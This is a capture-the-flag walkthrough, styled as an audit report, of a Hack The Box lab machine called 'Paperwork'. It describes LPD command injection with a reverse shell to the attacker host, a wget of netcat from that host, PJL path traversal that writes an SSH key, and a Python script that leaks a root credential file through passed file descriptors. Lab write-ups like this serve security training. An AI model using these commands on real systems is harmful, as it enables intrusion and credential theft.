# Security Audit Report
================================================================================
WALKTHROUGH: PAPERSWORK MACHINE (HACK THE BOX)
================================================================================

1. INITIAL RECONNAISSANCE & ENUMERATION
--------------------------------------------------------------------------------
The attack phase began with an aggressive full-port TCP SYN scan to map out the 
entire attack surface, followed by specific service fingerprinting.

Commands Used:
# Fast full-port discovery scan
nmap -p- --open -n -Pn -sS --min-rate 5000 -vvv <TARGET_IP> -oG allPorts

# Targeted service and script scanning
nmap -p22,80 -sC -sV <TARGET_IP> -oN targeted

# SMB Null-session enumeration check
smbclient -L <TARGET_IP> -N

Findings:
* Port 22: OpenSSH service active.
* Port 80: HTTP Nginx server active (hosting the Intake Portal web application).
* SMB: Enumerate check showed no active public shares available.

Further investigation of the web interface on Port 80 revealed a legacy 
archiving architecture. Leveraging a download link or directory fuzzing led to 
the extraction of a compressed file containing 'server.py', an internal 
Line Printer Daemon (LPD) script handling background data queues.


2. FOOTHOLD: INITIAL COMPROMISE (USER: lp)
--------------------------------------------------------------------------------
Analyzing the extracted 'server.py' source code revealed a critical security flaw.
The script processed print jobs via an un-sanitized 'subprocess.Popen' string 
concatenation under the print job name argument:
`subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)`

By constructing a standard RFC 1179 Line Printer Daemon control block, a remote 
attacker could manipulate the 'J' line field to close out the echo expression 
and execute arbitrary bash commands. 

An automated Python exploit script ('send_command.py') was engineered to convert 
malicious instructions into safe Base64 strings (avoiding quotes/space space parsing 
crashes), append required trailing null bytes (\x00), handle standard LPD 
queue synchronization milestones, and drop a stable reverse shell.

Execution Command (From Kali):
python3 send_command.py -h <TARGET_IP> -p 1515 -q archive_intake -i "bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1"

Result:
Successful remote code execution (RCE) via the LPD vulnerability. A stable connection 
was established as the 'lp' service user within '/opt/LPDServer'.


3. LATERAL MOVEMENT: VERTICAL PIVOT (USER: archivist)
--------------------------------------------------------------------------------
From the 'lp' shell, internal asset mapping revealed an isolated service running 
locally on port 127.0.0.1:9100. Analysis showed that this port hosted an active 
Printer Job Language (PJL) terminal server ('jetdirect.py') operating directly 
under the context of the 'archivist' user account.

The Clue:
Intelligence from InfoSec write-ups on LinkedIn pointed out that custom/embedded 
file managers processing PJL file data often contain systemic vulnerabilities 
related to directory and file system path traversals.

Investigation and Resolution:
Probing the path parsing logic with dynamic payloads confirmed that the pathing 
rules evaluated and accepted deep directory traversals. The key issue was formatting: 
interactive terminals and plain echo strings broke processing byte limits by feeding 
unwanted carriage returns (\r\n) or misaligning size attributes, stalling the server.

By switching to standard HP hardware formatting conventions, the script accurately 
read incoming data blocks. This breakthrough allowed writing an SSH public key directly 
to 'archivist''s private profile space.

Execution Commands (From 'lp' shell):
# Fetching custom compiled netcat to guarantee binary transport clean transmission
wget http://<KALI_IP>/nc_static -O /tmp/nc && chmod +x /tmp/nc

# Delivering the exact 391-byte Kali public key directly into the target home structure
printf '@PJL FSDOWNLOAD FORMAT:BINARY NAME="../../../home/archivist/.ssh/authorized_keys" SIZE=391\n%s\n' 'ssh-rsa AAAAB3NzaC1yc2E...[KEY_STRING]... kali@kali' | /tmp/nc 127.0.0.1 9100

Result:
The server responded with an "OK", verifying the correct file size adjustment. 
Logging in directly from Kali using the private key unlocked a native bash shell:
ssh -i id_paperwork archivist@<TARGET_IP>


4. PRIVILEGE ESCALATION: ROOT COMPROMISE
--------------------------------------------------------------------------------
With 'archivist' credentials secured, system architecture checks were performed to 
locate local root privilege escalation routes.

Commands Used:
find / -perm -4000 -type f 2>/dev/null  # No unique SUID vectors found
getcap -r / 2>/dev/null                # No exploitable file capabilities
ss -ltnp                               # Discovered isolated internal port 127.0.0.1:1337

Target Identification:
Ripping through file patterns for port 1337 across system configs revealed:
* Path: `/usr/bin/paperwork-daemon`
* Configuration: `/etc/systemd/system/paperwork.service` (Runs as User=root)

The Clue (The Vulnerability):
Reviewing the Python source code of `/usr/bin/paperwork-daemon` revealed a critical 
flaw. The script maintains a persistent open read descriptor to the superuser 
credentials configuration file:
`admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)`

More dangerously, if the script catches specific attack syntax (like 'FSQUERY', 
'FSUPLOAD', or 'FSDOWNLOAD') inside the log system file, it triggers a security lock:
```python
def trigger_lockdown(conn):
    log_fd = os.open(LOG_PATH, os.O_RDONLY)
    evidence_bundle = array.array("i", [log_fd, admin_fd])
    conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
```
Using `SCM_RIGHTS` via an active Unix socket connection transmits the script's raw, 
live file descriptors directly to any client attached to `/run/paperwork/mgmt.sock`.

Exploitation Execution:

1. Intentionally trigger the malice scanner by appending an attack keyword to the log:
   echo "FSQUERY TRIGGER" >> /home/archivist/printer/logs/commands.log

2. Execute a local tracking script to connect to the active management socket, read the 
   incoming ancillary control message data stream, and extract the open file handles.

Exploit Script Code (`/tmp/leak.py`):
```python
import socket, array, os

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")

fds = array.array("i")
_, ancdata, _, _ = s.recvmsg(1024, socket.CMSG_SPACE(fds.itemsize * 2))

for cmsg_level, cmsg_type, cmsg_data in ancdata:
    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
        fds.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % fds.itemsize)])
        admin_fd = fds[1] # Extract the second descriptor (admin_pins.conf)
        print(os.pread(admin_fd, 1024, 0).decode().strip())
s.close()
```

3. Run the leak tool to retrieve the cleartext root credentials from memory:
   python3 /tmp/leak.py

4. Switch system user contexts using the recovered password string:
   su - root

Result:
Full file descriptor reuse bypassed standard OS security parameters, dumping the 
secret string and granting total root shell access.
================================================================================
